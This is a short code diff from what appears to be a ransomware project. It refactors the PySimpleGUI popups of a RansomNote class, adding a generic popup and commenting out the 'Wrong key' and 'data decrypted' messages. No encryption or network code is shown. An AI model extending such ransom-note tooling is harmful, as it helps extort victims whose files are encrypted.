@@ -28,12 +28,17 @@ class RansomNote(object):
     def close_note():
         self.note.close()
 
-# TODO generalizar esta funcion en una cuyo parametro sea el texto
-def wrong_key_popup():
+def purple_pop_up(text=str):
+    sg.theme('DarkPurple5')
+    sg.Popup(text, keep_on_top=True, no_titlebar=True)
+
+"""
+def wrong_key_popup(text=str):
     sg.theme('DarkPurple5')
     sg.Popup('Wrong key', keep_on_top=True, no_titlebar=True)
     
 def bye_cha():
     sg.theme('DarkPurple5')
     sg.Popup("All data was decrypted successfully. Be careful on the internet next time ;)", keep_on_top=True, no_titlebar=True)
+"""
     
